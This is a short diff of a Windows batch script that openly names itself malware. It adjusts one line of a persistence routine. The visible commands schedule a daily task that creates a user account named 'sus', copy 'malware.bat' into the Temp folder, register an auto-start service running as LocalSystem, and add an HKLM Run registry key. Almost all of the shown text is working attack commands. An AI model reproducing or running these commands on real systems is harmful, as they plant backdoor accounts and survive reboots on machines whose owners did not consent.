@@ -43,7 +43,7 @@ SCHTASKS /CREATE /SC DAILY /TN "System\Nothing" /TR "cmd /C 'net user sus sus /a
 copy /Y "%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat" "C:\Windows\Temp\malware.bat"
 
 :: Create service
-sc create persistence binpath="cmd.exe /k C:\Windows\Temp\malware.bat" start="auto" obj="LocalSystem" /f
+sc create persistence binpath="cmd.exe /k C:\Windows\Temp\malware.bat" start="auto" obj="LocalSystem"
 
 :: Create registry keys for autorun
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f
